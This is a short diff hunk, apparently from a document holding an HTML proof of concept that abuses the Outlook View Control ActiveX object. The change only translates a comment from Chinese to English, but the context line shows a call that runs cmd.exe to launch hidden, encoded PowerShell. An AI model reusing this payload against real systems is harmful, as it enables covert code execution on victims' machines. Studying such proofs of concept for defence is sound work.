@@ -44,7 +44,7 @@ a.run('%windir%\\System32\\cmd.exe /c powershell -window hidden -enc [Command af
 
 <body>
   <object classid="clsid:0006F063-0000-0000-C000-000000000046" id="ViewCtl1" data="" width="100%" height="100%"></object>
-  //嵌入对象OutlookViewCtl CLSID
+  //Embedded object OutlookViewCtl CLSID
 </body>
 </html>
 ```
